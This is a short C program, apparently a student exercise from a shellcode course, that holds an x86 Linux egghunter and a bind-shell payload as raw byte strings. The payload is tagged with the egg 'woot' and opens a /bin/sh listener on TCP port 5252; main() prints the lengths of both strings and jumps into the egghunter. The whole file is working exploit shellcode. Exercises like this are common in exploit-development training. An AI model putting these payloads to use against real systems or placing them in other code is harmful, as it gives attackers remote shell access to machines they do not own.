#include <stdio.h>
#include <string.h>

/* code for egghunter */
unsigned char egghunter[]=\
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x74\x6f\x6f\x77\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";


/*bind shell on port 5252 code from assignment 1 prefixed 2x \x77\x6f\x6f\x74 */
unsigned char shellCode[]= \
"\x74\x6f\x6f\x77\x74\x6f\x6f\x77\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x6a\x66\x58\x56\x66\x68\x14\x84\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x6a\x66\x58\xb3\x04\x56\x57\x89\xe1\xcd\x80\x6a\x66\x58\x43\x56\x56\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";


void main()

{
	printf("Egg Hunter Length: %d\n", strlen(egghunter));
	printf("Shellcode Length: %d\n", strlen(shellCode));

	int (*ret)()=(int(*)())egghunter;

	ret();
}